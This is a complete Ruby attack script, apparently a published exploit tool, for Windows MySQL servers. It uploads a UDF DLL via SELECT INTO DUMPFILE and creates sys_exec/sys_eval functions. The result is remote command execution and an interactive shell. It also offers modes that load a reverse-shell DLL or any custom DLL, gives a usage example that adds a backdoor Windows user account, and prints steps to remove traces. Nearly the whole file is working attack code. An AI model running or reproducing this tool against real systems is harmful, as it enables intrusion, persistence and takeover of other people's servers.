#!/usr/bin/env ruby
#
# Windows MySQL UDF Exploit
# by: Hood3dRob1n
# 
# PICS:
# http://i.imgur.com/bXvqKj0.png (UDF Injection)

require 'optparse'
require 'colorize'
require 'mysql'
require 'readline'

# 31337 Banner
def banner
  puts
  puts "Windows MySQL UDF Exploit".light_green
  puts "By".light_green + ": Hood3dRob1n".white
end

# Clear Terminal
def cls
  system('clear')
end

# Generate a random aplha string length of value of num
def randz(num)
  (0...num).map{ ('a'..'z').to_a[rand(26)] }.join
end

# Execute commands in separate process
def fireNforget(command)
  pid = Process.fork
  if pid.nil?
    sleep(1)
    exec "#{command}" # This can now run in its own process thread and we dont have to wait for it
  else
    # In parent, detach the child process
    Process.detach(pid)
  end
end

# Check if Credentials work
# Return db object if success, nil otherwise
def can_we_connect?(host, user, pass, db=nil, port=3306)
  begin
    dbc = Mysql.connect(host, user, pass, db, port)
    return dbc
  rescue Mysql::Error => e
    puts "Connection Problem".light_red + "!".white
    puts "\t=> ".white + "#{e}".light_red
    return nil
  end
end

# Pass DB Object
# Confirm Windows OS
# Return true or false
def is_windows?(dbc)
  begin
    q = dbc.query('SELECT @@version_compile_os;')
    q.each { |x| @os = x[0] }
    if @os =~ /Win|\.NET/i
      if @os =~ /Win64/i
        @build='x64'
      else
        @build='x32'
      end
      return true
    else
      return false
    end
  rescue Mysql::Error => e
    puts "Problem confirming target is Windows".light_red + "!".white
    puts "\t=> ".white + "#{e}".light_red
    puts "Sorry, can't continue without this piece".light_red + "....\n\n".white
    exit 666;
  end
end

# Find Drive & Path in Use
def get_drive(dbc)
  begin
    q = dbc.query('SELECT @@tmpdir;')
    q.each { |x| @tmp=x[0]; }
    return @tmp[0]
  rescue Mysql::Error => e
    puts "Problem getting drive from @@tmpdir".light_red + "!".white
    puts "\t=> ".white + "#{e}".light_red
    return nil
  end
end

# Determine Plugin Directory
# This is where we need to write UDF to
def get_plugin_dir(dbc)
  begin
    q = dbc.query('SELECT @@plugin_dir;')
    q.each { |x| @pdir=x[0]; }
    if @pdir.nil?
      q = dbc.query("SHOW VARIABLES LIKE 'basedir';")
      q.each { |x| @pdir=x[1]; }
      plugpath = @pdir.split("\\").join("\\\\")
      plugpath += "\\\\lib\\\\plugin\\\\"
    else
      plugpath = @pdir.split("\\").join("\\\\")
      plugpath += "\\\\"
    end
    return plugpath
  rescue Mysql::Error => e
    puts "Problem determining the plugins directory".light_red + "!".white
    puts "\t=> ".white + "#{e}".light_red
    puts "Sorry, can't continue without this piece".light_red + "....\n\n".white
    exit 666;
  end
end

# Check if the UDF SYS_EXEC() function already exists
# Return true or false
def sys_exec_check(dbc)
  begin
    q = dbc.query("SELECT COUNT(*) FROM mysql.func WHERE name='sys_exec';")
    q.each do |x|
      if x[0].to_i == 0
        return false
      else
        return true
      end
    end
  rescue Mysql::Error => e
    puts "Problem Checking for SYS_EXEC() function".light_red + "!".white
    puts "\t=> ".white + "#{e}".light_red
    return false
  end
end

# Check if the UDF SYS_EVAL() function already exists
# Return true or false
def sys_eval_check(dbc)
  begin
    q = dbc.query("SELECT COUNT(*) FROM mysql.func WHERE name='sys_eval';")
    q.each do |x|
      if x[0].to_i == 0
        return false
      else
        return true
      end
    end
  rescue Mysql::Error => e
    puts "Problem Checking for SYS_EVAL() function".light_red + "!".white
    puts "\t=> ".white + "#{e}".light_red
    return false
  end
end

# Add UDF Package & Create Function
# SYS_EXEC() & SYS_EVAL() Created (allows CMD Exec)
def create_sys_functions(dbc)
  udf_name = randz(15) + ".dll"
  plugin_path = get_plugin_dir(dbc)
  @udf_dest = plugin_path.chomp + udf_name
  if @build == 'x64'
    file = './payloads/64/lib_mysqludf_sys.dll'
  elsif @build == 'x32'
    file = './payloads/32/lib_mysqludf_sys.dll'
  end

  # Upload our UDF DLL Payload file
  if write_bin_file(dbc, file, @udf_dest)
    begin
      # Drop function if its already there, then create new
      q = dbc.query("DROP FUNCTION IF EXISTS sys_exec;")
      q = dbc.query("CREATE FUNCTION sys_exec RETURNS int SONAME '#{udf_name}';")
      q = dbc.query("CREATE FUNCTION sys_eval RETURNS string SONAME '#{udf_name}';")

      # Confirm it was added and all is well....
      if sys_exec_check(dbc)
        return true
      else
        return false
      end
    rescue Mysql::Error => e
      puts "Problem creating UDF SYS functions".light_red + "!".white
      puts "\t=> ".white + "#{e}\n\n".light_red
      return false
    end
  end
end

# Create new function tied to custom DLL
# Once created (and called) it should trigger the DLL payload
# Any use beyond that is on the User
def create_custom_function(dbc, file)
  dll_name = randz(15) + ".dll"
  plugin_path = get_plugin_dir(dbc)
  @udf_dest = plugin_path.chomp + dll_name
  fake_function = 'sys_' + randz(5)

  # Upload our UDF DLL Payload file
  if write_bin_file(dbc, file, @udf_dest)
    begin
      puts "Payload DLL writen to disk".light_green + "!".white
      puts "Creating function to trigger now".light_blue + "....".white
      puts "Make sure your listener is ready".light_yellow + "....".white
      sleep(3)
      # Drop function if its already there, then create new
      q = dbc.query("DROP FUNCTION IF EXISTS #{fake_function};")
      q = dbc.query("CREATE FUNCTION #{fake_function} RETURNS string SONAME '#{dll_name}';")
      return fake_function
    rescue Mysql::Error => e
      puts "Error Triggered, Payload should have also been triggered".light_green + "!".white
      return fake_function
    end
  end
end

# Run Command via SYS_EXEC()
def sys_exec_cmd(dbc, cmd)
  begin
    q = dbc.query("SELECT sys_exec('#{cmd}');")
    q.each do |x|
      if x[0].to_i == 0
        return true
      else
        return false
      end
    end
  rescue Mysql::Error => e
    puts "Problem Executing Command".light_red + "!".white
    puts "\t=> ".white + "#{e}".light_red
    return false
  end
end

# Run Command via SYS_EXEC()
def sys_eval_cmd(dbc, cmd)
  begin
    q = dbc.query("SELECT sys_eval('#{cmd}');")
    q.each { |x| @res = x[0] }
    return @res
  rescue Mysql::Error => e
    puts "Problem Executing Command".light_red + "!".white
    puts "\t=> ".white + "#{e}".light_red
    return nil
  end
end

# Pseduo Shell Session
# Run consecutive commands
def udf_sys_shell(dbc)
  prompt = "(CMD)> "
  while line = Readline.readline("#{prompt}", true)
    cmd = line.chomp
    case cmd
    when /^exit$|^quit$/i
      puts "\n\nOK, exiting shell & closing connection".light_red + ".....".white
      break
    else
      res = sys_eval_cmd(dbc, cmd)
      puts
      if res.nil? or res == 'NULL'
        puts "NULL or No results returned".light_red + "....".white
      else
        puts "#{res}".white
      end
      puts
    end
  end
end

# Write Local Binary to File via INTO DUMPFILE
def write_bin_file(dbc, file, dll_dest)
  data = "0x" + File.open(file, 'rb').read.unpack('H*').first
  begin
    dbc.query("SELECT #{data} INTO DUMPFILE '#{dll_dest}';")
    puts "Appears things were a success".light_green + "!".white
    return true
  rescue Mysql::Error => e
    puts "Problem writing payload to file".light_red + "!".white
    puts "\t=> ".white + "#{e}".light_red
    if e =~ /MySQL server has gone away/
      puts "This is likely due to payload which is too large in size".light_red + ".....".white
      puts "Try compressing with UPX to shrink size down".light_red + ": upx 9 -qq #{file}".white
      puts "\t=> ".white + "Then try again".light_red + ".....".white
    end
    return false
  end
end

### MAIN ###
options = {}
optparse = OptionParser.new do |opts|
  opts.banner = "Usage:".light_green + "#{$0} ".white + "[".light_green + "OPTIONS".white + "]".light_green
  opts.separator ""
  opts.separator "EX:".light_green + " #{$0} -t 192.168..69.69 -u root -p root -C".white
  opts.separator "EX:".light_green + " #{$0} -t 192.168..69.69 -u root -p root -c \"net user hr P@ssw0rd1 /add\"".white
  opts.separator ""
  opts.separator "Options: ".light_green
  opts.on('-t', '--target IP', "\n\tTarget IP or IP Range".white) do |target|
    options[:target] = target.chomp
  end
  opts.on('-u', '--user USER', "\n\tMySQL User to Authenticate".white) do |user|
    options[:user] = user.chomp
  end
  opts.on('-p', '--pass PASS', "\n\tMySQL User Password".white) do |pass|
    options[:pass] = pass.chomp
  end
  opts.on('-C', '--connect', "\n\tConnect to SYS_EVAL() Shell".white) do |meh|
    options[:mode] = 6
  end
  opts.on('-c', '--cmd CMD', "\n\tRun Command via Existing SYS_EXEC() Function".white) do |cmd|
    options[:mode] = 5
    options[:payload] = cmd.chomp
  end
  opts.on('-U', '--upload-mode NUM', "\n\tUpload Mode: 1:UDF_x32, 2:UDF_x64, 3:REVERSE, 4:CUSTOM".white) do |mode|
    failure=false
    m = mode.chomp.to_i
    if m == 1
      options[:mode] = 1
      if File.exists?('./payloads/32/lib_mysqludf_sys.dll') and not File.directory?('./payloads/32/lib_mysqludf_sys.dll')
        options[:payload] = './payloads/32/lib_mysqludf_sys.dll'
      else
        failure=true
      end
    elsif m == 2
      options[:mode] = 2
      if File.exists?('./payloads/64/lib_mysqludf_sys.dll') and not File.directory?('./payloads/64/lib_mysqludf_sys.dll')
        options[:payload] = './payloads/64/lib_mysqludf_sys.dll'
      else
        failure=true
      end
    elsif m == 3
      options[:mode] = 3
      if File.exists?('./payloads/reverse_udf.dll') and not File.directory?('./payloads/reverse_udf.dll')
        options[:payload] = './payloads/reverse_udf.dll'
      else
        failure=true
      end
    elsif m == 4
      options[:mode] = 4
    else
      failure=true
    end
    if failure
      cls
      banner
      puts
      puts "Unable to load default DLL payload".light_red + "!".white
      puts "Check path or permissions and try again".light_red + "....".white
      puts
      puts opts
      puts
      exit 69;
    end
  end
  opts.on('-d', '--custom-dll DLL', "\n\tDLL to Upload for Custom Upload Option".white) do |dll|
    if File.exists?(dll.chomp) and not File.directory?(dll.chomp)
      options[:payload] = dll.chomp
    else
      cls
      banner
      puts
      puts "Unable to load custom DLL payload".light_red + "!".white
      puts "Check path or permissions and try again".light_red + "....".white
      puts
      puts opts
      puts
      exit 69;
    end
  end
  opts.on('-f', '--force', "\n\tForce Creation of UDF SYS Functions".white) do |meh|
    options[:force] = 'true'
  end
  opts.on('-h', '--help', "\n\tHelp Menu".white) do 
    cls
    banner
    puts
    puts opts
    puts
    exit 69;
  end
end
begin
  foo = ARGV[0] || ARGV[0] = "-h"
  optparse.parse!
  if options[:mode].to_i == 4
    mandatory = [ :mode, :target, :user, :pass, :payload ]
  else
    mandatory = [ :mode, :target, :user, :pass ]
  end
  missing = mandatory.select{ |param| options[param].nil? }
  if not missing.empty?
    cls
    banner
    puts
    puts "Missing options".light_red + ": #{missing.join(', ')}".white
    puts optparse
    exit 666;
  end
rescue OptionParser::InvalidOption, OptionParser::MissingArgument
  cls
  banner
  puts
  puts $!.to_s
  puts
  puts optparse
  puts
  exit 666;   
end

cls
banner
puts "\n\n"
dbc = can_we_connect?(options[:target], options[:user], options[:pass], nil, 3306)
if not dbc.nil?
  # This only works on windows....
  if is_windows?(dbc)
    if options[:mode].to_i > 0 and options[:mode].to_i <= 2
      # SYS_EXEC() UDF Injection, 1:UDF_x32, 2:UDF_x64,
      if options[:force].nil?
        @force=false
      else
        @force=true
      end
      if options[:mode].to_i == 1
        @build='x32'
      else
        @build='x64'
      end
      # Check if sys_exec() already exists
      if not sys_exec_check(dbc)
        exists=false  
      else
        if @force
          exists=false # We will drop it before creating it
        else
          puts "Appears the 'sys_exec()' function already exists".light_yellow + "!".white
          puts "You can use the -C option to connect and use for cmd shell".light_yellow + "....".white
          puts "You can also use the -f option to force new function creation".light_yellow + ".....".white
          exists=true
        end
      end
      # Create or re-create the sys_exec() function
      if not exists
        if create_sys_functions(dbc)
          puts "Appears UDF Injection was a success".light_green + "!".white
          puts "UDF Functions sys_exec() & sys_eval() created and linked to".light_green + ": #{@udf_dest}".white
          puts "Dropping to pseduo shell so you can do your thing".light_blue + ".....".white
          puts "Type '".light_yellow + "EXIT".white + "' or '".light_yellow + "QUIT".white + "' to close and exit the pseudo shell session".light_yellow + "....".white
          puts
          puts
          udf_sys_shell(dbc)
          puts
          puts "Got SYSTEM".light_green + "?".white
          puts
          puts "To Remove delete the linked DLL and DROP the MySQL Functions".light_yellow + ": ".white
          puts " Linked DLL".light_yellow + ": #{@udf_dest}"
          puts " SQL".light_yellow + ": "
          puts "    DROP FUNCTION sys_exec;".white
          puts "    DROP FUNCTION sys_eval;".white
        end
      end
    elsif options[:mode].to_i == 3
      # Kingcope Exploit Re-Used
      # Reverse Command Shell via DLL Injection
      win = create_custom_function(dbc, options[:payload])
      if not win.nil?
        puts
        puts "To Remove traces delete the Payload DLL".light_yellow + ": ".white
        puts " #{@udf_dest}".white
      end
    elsif options[:mode].to_i == 4
      # Custom DLL Injection
      win = create_custom_function(dbc, options[:payload])
      if not win.nil?
        puts
        puts "To Remove traces delete the Payload DLL".light_yellow + ": ".white
        puts " #{@udf_dest}".white
      end
    elsif options[:mode].to_i == 5
      # Connect & Run CMD via Existing SYS_EXEC() Instance
      if sys_exec_check(dbc)
        puts "Confirmed sys_exec() exists".light_green + "!".white
        puts "Running command '".light_blue + "#{options[:payload]}".white + "' now".light_blue + ".....".white
        if sys_exec_cmd(dbc, options[:payload])
          puts "Appears command was run & things went well".light_green + "....".white
        else
          puts "Sorry, appears something went wrong executing command".light_red + "....".white
          puts "Check command syntax, proper path escaping, and try again".light_red + ".....".white
        end
      else
        puts "SYS_EXEC() Function does NOT exist".light_red + "!".white
        puts "Try the upload (mode 1 or 2) option to upload and create it".light_red + "...".white
        puts "Then you can try again or do it manually".light_red + ".....".white
      end
    elsif options[:mode].to_i == 6
      # Connect to existing SYS_EVAL() function
      # Drop to pseudo shell
      if sys_eval_check(dbc)
        puts "Confirmed sys_eval() exists".light_green + "!".white
        puts "Dropping to pseduo shell so you can do your thing".light_blue + ".....".white
        puts "Type '".light_yellow + "EXIT".white + "' or '".light_yellow + "QUIT".white + "' to close and exit the pseudo shell session".light_yellow + "....".white
        puts
        puts
        udf_sys_shell(dbc)
        puts
        puts "Got SYSTEM".light_green + "?".white
      else
        puts "SYS_EVAL() Function does NOT exist".light_red + "!".white
        puts "Try the upload (mode 1 or 2) option to upload and create it".light_red + "...".white
        puts "Then you can try again or do it manually".light_red + ".....".white
      end
    end
  else
    puts "This only works against Windows targets".light_red + "!".white
    puts "Find another target or find another way in".light_red + ".....".white
  end
end
puts
puts
#EOF
